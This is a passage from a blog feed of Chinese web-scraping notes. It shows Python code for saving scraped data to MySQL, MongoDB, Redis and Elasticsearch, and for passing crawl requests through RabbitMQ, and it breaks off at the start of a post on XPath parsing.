class="string">&#x27;20220220&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;:Bob&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line">table = <span class="string">&#x27;students&#x27;</span></span><br><span class="line">keys = <span class="string">&#x27;, &#x27;</span>.join(data.keys())</span><br><span class="line">values = <span class="string">&#x27;, &#x27;</span>.join([<span class="string">&#x27;%s&#x27;</span>] * <span class="built_in">len</span>(data))</span><br><span class="line">sql = <span class="string">&#x27;INSERT INTO &#123;table&#125;(&#123;keys&#125;) VALUES(&#123;values&#125;)&#x27;</span>.<span class="built_in">format</span>(table=table, keys=keys, values=values)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> cursor.execute(sql, <span class="built_in">tuple</span>(data.values())):</span><br><span class="line">        print(<span class="string">&#x27;Successful&#x27;</span>)</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> pymysql.Error <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line">    print(e.args[<span class="number">0</span>], e.args[<span class="number">1</span>])</span><br><span class="line">    db.rollback()</span><br></pre></td></tr></table></figure><p>更新和删除操作类似，这里还需要说明下查询过程常用的几个方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(sql)</span><br><span class="line">print(<span class="string">&#x27;Count: &#x27;</span>, cursor.rowcount) <span class="comment"># 获取查询结果条数</span></span><br><span class="line">result = cursor.fetchone() <span class="comment"># 获取第一条查询结果</span></span><br><span class="line">result = cursor.fetchall() <span class="comment"># 获取所有数据</span></span><br><span class="line"><span class="comment"># 如果数据较多，使用 fetchall() 占用开销较大，推荐下面方法</span></span><br><span class="line">row = cursor.fetchone()</span><br><span class="line"><span class="keyword">while</span> row:</span><br><span class="line">    print(<span class="string">&#x27;Row: &#x27;</span>, row)</span><br><span class="line">    row = cursor.fetchone()</span><br></pre></td></tr></table></figure><h3 id="MongoDB-文档存储"><a href="#MongoDB-文档存储" class="headerlink" title="MongoDB 文档存储"></a>MongoDB 文档存储</h3><p>NoSQL(Not Only SQL)，意为不仅仅是 SQL，泛指非关系型数据库。NoSQL 是基于键值对的，不需要经过 SQL 层的解析，数据之间没有耦合性，性能非常高。</p><p>非关系型数据库可细分为：</p><ul><li>键值存储数据库：Redis、Voldemort 和 Oracle BDD 等；</li><li>列存储数据库：Cassandra、HBase 和 Riak 等；</li><li>文档型数据库：CouchDB 和 MongoDB 等；</li><li>图形数据库：Neo4J、InfoGrid 和 Infinite Graph 等。</li></ul><p>对爬虫的数据存储来说，非关系型数据库往往更简单高效。</p><p>MongoDB 是用 C++ 编写的，内容存储形式类似 JSON 对象，它的字段值可以包含其他文档、数组及文档数组，非常灵活。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">27017</span>)</span><br><span class="line"><span class="comment"># client = pymongo.MongoClient(&#x27;mongodb://localhost:27017/&#x27;)</span></span><br><span class="line">db = client.test  <span class="comment"># 或 client[&#x27;test&#x27;]</span></span><br><span class="line">collection = db.students  <span class="comment"># db[&#x27;students&#x27;]</span></span><br><span class="line">student = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;20220220&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Jordan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;male&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">result = collection.insert_one(student)</span><br><span class="line">result1 = collection.insert_many([student1, student2])</span><br><span class="line">print(result)</span><br><span class="line">print(result.inserted_id)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">&lt;pymongo.results.InsertOneResult <span class="built_in">object</span> at <span class="number">0x000001F46043BE80</span>&gt;</span><br><span class="line">62123cdad1351490060fecf3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line">result2 = collection.find_one(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Mike&#x27;</span>&#125;)</span><br><span class="line">result3 = collection.find(&#123;<span class="string">&#x27;age&#x27;</span>: &#123;<span class="string">&#x27;$gt&#x27;</span>: <span class="number">20</span>&#125;&#125;)  <span class="comment"># 查找所有数据，结果为生成器</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">查询条件中的比较符号一览：</span></span><br><span class="line"><span class="string">$lt, $gt, $lte, $gte, $ne, $in, $nin </span></span><br><span class="line"><span class="string">小于，大于，小于等于，大于等于，不等于，在范围内，不在范围内</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">功能符号一览：</span></span><br><span class="line"><span class="string">$regex</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数</span></span><br><span class="line">count = collection.find().count()  </span><br><span class="line"><span class="comment"># 排序，偏移，指定获取个数 -&gt; sort result: [&#x27;Harden&#x27;, &#x27;Jordan&#x27;, &#x27;Kevin&#x27;, &#x27;Mark&#x27;, &#x27;Mike&#x27;]</span></span><br><span class="line">results = collection.find().sort(<span class="string">&#x27;name&#x27;</span>, pymongo.ASCENDING).skip(<span class="number">2</span>).limit(<span class="number">2</span>)</span><br><span class="line">-&gt; [&#x27;Kevin&#x27;, &#x27;Mark&#x27;]</span><br><span class="line"><span class="comment"># 数据量非常庞大时（千万、亿级别），最好不要用大偏移，可能导致内存溢出，可使用如下操作来查询</span></span><br><span class="line"><span class="keyword">from</span> bson.objectid <span class="keyword">import</span> ObjectId</span><br><span class="line">collection.find(&#123;<span class="string">&#x27;_id&#x27;</span>: &#123;<span class="string">&#x27;$gt&#x27;</span>: ObjectId(<span class="string">&#x27;62123cdad1351490060fecf3&#x27;</span>)&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新</span></span><br><span class="line">condition = &#123;<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Kevin&#x27;</span>&#125;</span><br><span class="line">student = collection.find_one(condition)</span><br><span class="line">student[<span class="string">&#x27;age&#x27;</span>] = <span class="number">25</span></span><br><span class="line">result = collection.update_one(condition, &#123;<span class="string">&#x27;$set&#x27;</span>: student&#125;)  <span class="comment">## update_many()</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.matched_count, result.modified_count)  <span class="comment"># 匹配数据条数和影响的数据条数</span></span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">&lt;pymongo.results.UpdateResult <span class="built_in">object</span> at <span class="number">0x10d17b678</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">result = collection.delete_one(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Kevin&#x27;</span>&#125;)  <span class="comment">## delete_many()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">PyMongo 还提供了一些组合方法，如 </span></span><br><span class="line"><span class="string">find_one_and_delete, find_one_and_replace, find_one_and_update 等</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>还有一些功能符号</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th><th align="center">实例</th><th align="center">实例含义</th></tr></thead><tbody><tr><td align="center">$regex</td><td align="center">正则匹配</td><td align="center">{‘name’, {‘$regex’: ‘^M.*’}}</td><td align="center">name 以 M 开头</td></tr><tr><td align="center">$exists</td><td align="center">属性是否存在</td><td align="center">{‘name’, {‘$exists’: True}}</td><td align="center">存在 name 属性</td></tr><tr><td align="center">$type</td><td align="center">类型判断</td><td align="center">{‘age’, {‘$type’: ‘int’}}</td><td align="center">age 类型为 int</td></tr><tr><td align="center">$mod</td><td align="center">数字模操作</td><td align="center">{‘age’, {‘$mod’: [5, 0]}}</td><td align="center">age 模 5 余 0</td></tr><tr><td align="center">$text</td><td align="center">文本查询</td><td align="center">{‘$text’: {‘$search’: ‘Mike’}}</td><td align="center">text 类型属性中包含 Mike</td></tr><tr><td align="center">$where</td><td align="center">高级条件查询</td><td align="center">{‘$where’: ‘obj.fans_count == obj.follows_count’}</td><td align="center">自身粉丝数等于关注数</td></tr></tbody></table><p><a href="https://docs.mongoing.com/">官方手册</a></p><h3 id="Redis-缓存存储"><a href="#Redis-缓存存储" class="headerlink" title="Redis 缓存存储"></a>Redis 缓存存储</h3><p>Redis 是一个基于内存的、高效的键值型非关系型数据库。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> StrictRedis, ConnectionPool</span><br><span class="line"></span><br><span class="line">redis = StrictRedis(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">6379</span>, db=<span class="number">0</span>, password=<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- 也可以这样连接</span></span><br><span class="line"><span class="string">pool = ConnectionPool(host=&#x27;localhost&#x27;, port=6379, db=0, password=&#x27;test&#x27;)</span></span><br><span class="line"><span class="string">redis = StrictRedis(connection_pool=pool)</span></span><br><span class="line"><span class="string">- ConnectionPool 支持 URL 连接</span></span><br><span class="line"><span class="string">url = &#x27;redis://:test@localhost:679/0&#x27;</span></span><br><span class="line"><span class="string">pool = ConnectionPool.from.url(url)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">redis.<span class="built_in">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>)</span><br><span class="line">print(redis.get(<span class="string">&#x27;name&#x27;</span>))</span><br></pre></td></tr></table></figure><p>Redis 支持多种数据存储结构，并提供了丰富的 API，包括键操作、字符串操作、列表操作、集合操作、有序集合操作、散列操作。具体可以查看 <a href="https://redis.com.cn/commands.html">Redis 命令手册</a></p><h3 id="Elasticsearch-搜索引擎存储"><a href="#Elasticsearch-搜索引擎存储" class="headerlink" title="Elasticsearch 搜索引擎存储"></a>Elasticsearch 搜索引擎存储</h3><p>如果为了便于存储和检索，想要实现自己的搜索引擎，Elasticsearch 就是不二之选。这是一个全文搜索引擎，可以快速存储、检索和分析海量数据。</p><p>Elasticsearch是一个开源的搜索引擎，建立在一个全文搜索引擎库 Apache Lucene™ 的基础之上。</p><p>Lucene 是目前拥有最先进、高性能的全功能搜索引擎功能的库，Elasticsearch 对 Lucene 做了一层封装，提供了一套简单一致的 RESTful API 来帮助我们实现存储和检索，可以如此形容：</p><ul><li>一个分布式的实时文档存储库，每个字段都可以被索引与搜索；</li><li>一个分布式的实时分布搜索引擎；</li><li>能胜任上百个服务节点的扩展，并支持 PB 级别的结构化或者非结构化数据。</li></ul><p><a href="https://blog.csdn.net/winnershili/article/details/122944188">安装方法</a>， Kibana 支持对 Elasticsearch 数据进行可视化和分析，配合使用更佳。</p><p>有几个概念需要明确：</p><ul><li>节点和集群：单个 Elasticsearch 实例称为一个节点（Node），一组节点构成一个集群（Cluster）；</li><li>索引：即 index，Elasticsearch 会索引所有字段，经过处理后写入一个反向索引（inverted index）。Elasticsearch 数据管理的顶层单位就是索引，相当于数据库的概念，另外，索引名字必须小写；</li><li>文档：索引里的单条记录称为文档（document），同一个索引中的文档不要求有相同的结构（scheme），但最好保持一致，有助提高搜索效率；</li><li>类型：文档可以分组，叫做类型（Type），类似 MySQL 中的数据表、MongoDB 中的集合。不同类型的文档应该具有相似的结构，即应该把不同性质的数据存成两个索引。Elasticsearch 6.x 每个索引只能包含一个类型，而到 7.x 会移除类型；</li><li>字段：每个文档类似 JSON 结构，包含许多字段，每个字段有其对应的值，类比为 MySQL 数据表中字段。</li></ul><p>用对比图来直观类比 Elasticsearch 和传统关系型数据库：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reletional DB -&gt; Database -&gt; Tables -&gt; Rows      -&gt; Columns</span><br><span class="line">Elasticsearch -&gt; Indices  -&gt; Types  -&gt; Documents -&gt; Fields</span><br></pre></td></tr></table></figure><p>Elasticsearch 的特殊强大之处就在检索功能</p><ul><li>Elasticsearch 对模糊搜索非常擅长（搜索速度很快）</li><li>从 Elasticsearch 搜索到的数据可以根据<strong>评分</strong>过滤，如只返回评分高的给用户</li><li>没有那么准确的关键字也能搜出相关的结果（能匹配有相关性的记录）</li></ul><p><a href="https://elasticsearch-py.readthedocs.io/en/master/">使用手册</a>，<a href="https://cloud.tencent.com/developer/article/1583402">什么是 Elasticsearch？一篇搞懂</a></p><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><p>为了降低进程间的耦合度，需要一个类似消息队列的中间件来存储和转发消息，实现进程间通信。</p><p>RabbitMQ 是一款使用 Erlang 语言开发的，实现 AMQP(高级消息队列协议)的开源消息中间件，其主要特点有面向消息、队列、路由(包括点对点和发布/订阅)，可靠性、安全性。具体特点有以下这些：</p><ul><li>可靠性。支持持久化，传输确认，发布确认等保证了MQ的可靠性。</li><li>灵活的分发消息策略。这应该是 RabbitMQ 的一大特点。在消息进入MQ前由Exchange(交换机)进行路由消息。分发消息策略有：简单模式、工作队列模式、发布订阅模式、路由模式、通配符模式。</li><li>支持集群。多台 RabbitMQ 服务器可以组成一个集群，形成一个逻辑Broker。</li><li>高可用：消息队列在部分节点出问题的情况下仍然可用。</li><li>多种协议。RabbitMQ支持多种消息队列协议，比如 STOMP、MQTT 等等。</li><li>支持多种语言客户端。RabbitMQ 几乎支持所有常用编程语言，包括 Java、.NET、Ruby 等等。</li><li>可视化管理界面。RabbitMQ 提供了一个易用的用户界面，使得用户可以监控和管理消息 Broker。</li><li>插件机制。RabbitMQ 提供了许多插件，可以通过插件进行扩展，也可以编写自己的插件。</li></ul><p>使用上主要三个步骤，声明队列，生产内容和消费内容。</p><p><code>producer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line">QUEUE_NAME = <span class="string">&#x27;scrape&#x27;</span></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">channel.queue_declare(queue=QUEUE_NAME)</span><br><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;&#x27;</span>, routing_key=QUEUE_NAME, body=<span class="string">&#x27;Hel World!&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>consumer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line">QUEUE_NAME = <span class="string">&#x27;scrape&#x27;</span></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">channel.queue_declare(queue=QUEUE_NAME)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span>(<span class="params">ch, method, properties, body</span>):</span></span><br><span class="line">    print(<span class="string">f&quot;Get <span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># auto_ack=True 表示获取消息后会通知消息队列当前消息已处理</span></span><br><span class="line">channel.basic_consume(queue=<span class="string">&#x27;scrape&#x27;</span>, auto_ack=<span class="literal">True</span>, on_message_callback=callback)</span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure><p>运行 <code>producer.py</code>后会往消息队列放入一个消息，<code>consumer.py</code>运行后会一直监听，可以发现输出结果为<code>Get b&#39;Hello World!&#39;</code></p><p>上面的例子实现的是最简单的生产者和消费者间通信，但这在实际爬虫中是不太现实的，因为把消费者实现为了“订阅”模式，会一直处于监听状态，一旦有消息就要立马处理，无法主动控制取用消息的时机。下面我们实现一种随取随用的例子，里面还用到了优先级队列和队列持久化技术：</p><p><code>producer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 input() 来获取生产者数据，输入字符串和优先级，输入后会被放入消息队列中</span></span><br><span class="line">MAX_PRIORITY = <span class="number">100</span></span><br><span class="line">QUEUE_NAME = <span class="string">&#x27;scrape&#x27;</span></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">channel.queue_declare(queue=QUEUE_NAME)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data, priority = <span class="built_in">input</span>().split()</span><br><span class="line">    channel.basic_publish(exchange=<span class="string">&#x27;&#x27;</span>, routing_key=QUEUE_NAME, properties=pika.BasicProperties(priority=<span class="built_in">int</span>(priority)),</span><br><span class="line">                          body=data)</span><br><span class="line">    print(<span class="string">f&#x27;Put <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">foo <span class="number">40</span></span><br><span class="line">Put foo</span><br><span class="line">bar <span class="number">20</span></span><br><span class="line">Put bar</span><br><span class="line">baz <span class="number">50</span></span><br><span class="line">Put baz</span><br></pre></td></tr></table></figure><p><code>consumer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 input() 来控制消费者何时获取下一个数据，同时按照优先级取出对应消息</span></span><br><span class="line">QUEUE_NAME = <span class="string">&#x27;scrape&#x27;</span></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    method_frame, header, body = channel.basic_get(queue=<span class="string">&#x27;scrape&#x27;</span>, auto_ack=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        print(<span class="string">f&#x27;Get <span class="subst">&#123;body&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line"></span><br><span class="line">Get <span class="string">b&#x27;bar&#x27;</span></span><br><span class="line"></span><br><span class="line">Get <span class="string">b&#x27;foo&#x27;</span></span><br><span class="line"></span><br><span class="line">Get <span class="string">b&#x27;baz&#x27;</span></span><br></pre></td></tr></table></figure><p>实战，爬取电源网站链接</p><p><code>producer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle  <span class="comment"># 序列化</span></span><br><span class="line"></span><br><span class="line">TOTAL = <span class="number">100</span></span><br><span class="line">QUEUE_NAME = <span class="string">&#x27;scrape_queue&#x27;</span></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">channel.queue_declare(queue=QUEUE_NAME, durable=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, TOTAL + <span class="number">1</span>):</span><br><span class="line">    url = <span class="string">f&#x27;https://ssr1.scrape.center/detail/<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    request = requests.Request(<span class="string">&#x27;GET&#x27;</span>, url)</span><br><span class="line"></span><br><span class="line">    channel.basic_publish(exchange=<span class="string">&#x27;&#x27;</span>, routing_key=QUEUE_NAME,</span><br><span class="line">                          properties=pika.BasicProperties(delivery_mode=<span class="number">2</span>),</span><br><span class="line">                          body=pickle.dumps(request))</span><br><span class="line">    print(<span class="string">f&#x27;Put request of <span class="subst">&#123;url&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/21/M1kRlrJvc3uUDgE.png"></p><p><code>consumer.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">QUEUE_NAME = <span class="string">&#x27;scrape_queue&#x27;</span></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scrape</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.send(request.prepare())</span><br><span class="line">        print(<span class="string">f&#x27;success scraped <span class="subst">&#123;response.url&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException:</span><br><span class="line">        print(<span class="string">f&#x27;error occurred when scraping <span class="subst">&#123;request.url&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    method_frame, header, body = channel.basic_get(queue=QUEUE_NAME, auto_ack=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> body:</span><br><span class="line">        request = pickle.loads(body)</span><br><span class="line">        print(<span class="string">f&#x27;Get <span class="subst">&#123;request&#125;</span>&#x27;</span>)</span><br><span class="line">        scrape(request)</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/02/21/qv4mLSx3awF8i79.png"></p><p>可以看到，消费者依次取出请求对象完成了一个个爬取任务。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/2z4tLguB3OP8nN6.png&quot; style=&quot;zoom:67%;&quot; /&gt;

&lt;p&gt;解析库解析出数据后，可以将数据保存文本文件，如 TXT、JSON、CSV 等，也可以将数据保存到数据库 MySQL，非关系型数据库 MongoDB、Redis 等，另外，还可以直接把数据存储到搜索引擎（如 Elasticsearch）中，以便检索和查看。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记三 -- 解析库的使用</title>
    <link href="https://speedpromise.github.io/archives/79659fc4.html"/>
    <id>https://speedpromise.github.io/archives/79659fc4.html</id>
    <published>2022-02-19T02:36:20.000Z</published>
    <updated>2022-02-20T12:27:43.635Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png" style="zoom: 67%;" /><p>本章我们了解几种解析库的使用，包括 XPath、Beautiful Soup、PyQuery、Parsel，实际可根据场景和个人使用习惯来选择。</p><span id="more"></span><h3 id="XPath-的使用"><a href="#XPath-的使用" class="headerlink" title="XPath 的使用"></a>XPath 的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">html = etree.html(text)</span><br><span class="line"><span class="comment"># html = etree.parse(&#x27;./test.html&#x27;, etree.HTMLParser())</span></span><br><span class="line">result = etree.tostring(html)</span><br><span class="line">print(result.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>全称是 XML Path Language，etree 模块可以自动修正 HTML 文本。其常用规则如下表：</p><table><thead><tr><th align="center">表达式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">nodename</td><td align="center">选取此节点的所有子节点</td></tr><tr><td align="center">/</td><td align="center">从当前节点选取直接子节点</td></tr><tr><td align="center">//</td><td align="center">从当前节点选取子孙节点</td></tr><tr><td align="center">.</td><td align="center">选取当前节点</td></tr><tr><td align="center">..  or parent::</td><td align="center">选取当前节点的父节点</td></tr><tr><td align="center">@</td><td align="center">选取属性</td></tr><tr><td align="center">text()</td><td align="center">文本获取</td></tr><tr><td align="center">contains()</td><td align="center">属性多值匹配，包含属性值即可匹配</td></tr><tr><td align="center">last()</td><td align="center">最后一个</td></tr><tr><td align="center">position()</td><td 